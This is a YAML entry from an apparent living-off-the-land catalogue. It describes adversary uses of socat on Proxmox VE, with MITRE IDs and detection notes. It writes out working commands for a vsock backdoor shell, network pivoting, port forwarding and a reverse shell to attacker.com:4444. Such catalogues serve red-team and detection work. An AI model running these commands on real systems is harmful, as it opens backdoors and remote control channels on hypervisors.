---
Name: socat
Description: socat is a multipurpose relay tool available on Proxmox VE systems. It can create bidirectional data channels between various endpoints including files, sockets, and network connections. Adversaries can leverage socat for vsock covert channels between host and guests, port forwarding, and establishing reverse shells.
Author: 'ZephrFish'
Created: 2025-12-06
Commands:
  - Command: socat - VSOCK-CONNECT:{cid}:{port}
    Description: Connect to a vsock listener on a VM using its CID (Context ID).
    Usecase: Establish covert communication channel with a VM bypassing network monitoring.
    Category: command and control
    Privileges: Administrator
    MitreID: T1572
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - socat - VSOCK-CONNECT:3:1234
      - socat TCP-LISTEN:4444,fork VSOCK-CONNECT:3:1234
    Tags:
      - Covert Channel
      - vsock

  - Command: socat VSOCK-LISTEN:{port},fork EXEC:/bin/bash
    Description: Create a vsock listener that spawns a shell on connection.
    Usecase: Establish a backdoor shell accessible via vsock from guest VMs.
    Category: execution
    Privileges: Administrator
    MitreID: T1059.004
    OperatingSystem: Proxmox VE
    Tags:
      - Persistence
      - vsock

  - Command: socat TCP-LISTEN:{port},fork VSOCK-CONNECT:{cid}:{vport}
    Description: Bridge a TCP port to a vsock connection for network pivoting.
    Usecase: Pivot network traffic through vsock to reach isolated guest VMs.
    Category: lateral movement
    Privileges: Administrator
    MitreID: T1090
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - socat TCP-LISTEN:8080,fork VSOCK-CONNECT:3:80
      - socat TCP-LISTEN:22222,fork VSOCK-CONNECT:5:22

  - Command: socat UNIX-CONNECT:/run/qemu-server/{vmid}.qmp -
    Description: Connect to QEMU Machine Protocol socket for direct VM control.
    Usecase: Direct QEMU control for advanced VM manipulation bypassing Proxmox APIs.
    Category: execution
    Privileges: Administrator
    MitreID: T1059
    OperatingSystem: Proxmox VE

  - Command: socat TCP-LISTEN:{port},fork TCP:{target}:{tport}
    Description: Create a TCP port forwarder.
    Usecase: Establish port forwarding for lateral movement or exfiltration.
    Category: lateral movement
    Privileges: Administrator
    MitreID: T1090.001
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - socat TCP-LISTEN:3389,fork TCP:192.168.1.100:3389
      - socat TCP-LISTEN:1433,fork TCP:dc01.internal:1433

  - Command: socat EXEC:/bin/bash TCP:{attacker}:{port}
    Description: Establish a reverse shell connection.
    Usecase: Create reverse shell to attacker-controlled infrastructure.
    Category: command and control
    Privileges: Administrator
    MitreID: T1059.004
    OperatingSystem: Proxmox VE
    ProceduralExamples:
      - socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:attacker.com:4444

Full_Path:
  - Path: /usr/bin/socat

Detection:
  - Note: Monitor for socat processes with VSOCK connections
  - Note: Watch for unusual TCP listeners created by socat
  - Note: Alert on socat EXEC patterns

Resources:
  - Link: http://www.dest-unreach.org/socat/
  - Link: https://man7.org/linux/man-pages/man7/vsock.7.html

Acknowledgement:
  - Person: ZephrFish
    Handle: '@ZephrFish'
---
